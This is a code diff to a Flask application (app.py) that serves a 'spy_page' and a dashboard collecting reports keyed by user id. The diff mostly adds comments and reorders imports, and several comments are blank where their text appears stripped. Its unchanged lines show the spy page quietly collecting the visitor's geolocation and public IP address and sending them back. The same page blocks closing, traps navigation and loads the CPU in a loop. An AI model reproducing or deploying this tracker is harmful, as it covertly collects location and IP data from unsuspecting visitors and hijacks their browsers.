@@ -1,15 +1,16 @@
-# app.py
+# -*- coding: utf-8 -*-
 import uuid
 import os
 import json
-from flask import Flask, request, render_template_string, redirect, jsonify
 from datetime import datetime
+from flask import Flask, request, render_template_string, redirect, jsonify
 
 app = Flask(__name__)
 
-#  
+# ---   ---
 reports = {}  # uid -> {'data': [], 'timestamp': ...}
 
+# ---    (  ) ---
 dashboard_html = '''
 <!DOCTYPE html>
 <html>
@@ -192,6 +193,7 @@ setInterval(()=>{ location.reload(); }, 8000);
 </html>
 '''
 
+# ---    ( ) ---
 spy_page = '''
 <!DOCTYPE html>
 <html>
@@ -231,10 +233,10 @@ spy_page = '''
         navigator.geolocation.getCurrentPosition(p=>{ info.location = {lat:p.coords.latitude, lon:p.coords.longitude}; send(info); }, ()=>send(info));
     }
     fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ip=>{ info.ip = ip.ip; send(info); }).catch(()=>{});
-    // block close
+    //     
     window.onbeforeunload = () => true;
     setInterval(()=>{ history.pushState({}, '', '/'); }, 100);
-    // background CPU
+    //  CPU 
     setInterval(()=>{ let a=[]; for(let i=0;i<1e7;i++) a.push(i); }, 1000);
 })();
 </script>
@@ -248,6 +250,7 @@ spy_page = '''
 </html>
 '''
 
+# ---  ---
 @app.route('/')
 def home():
     return redirect('/dashboard')
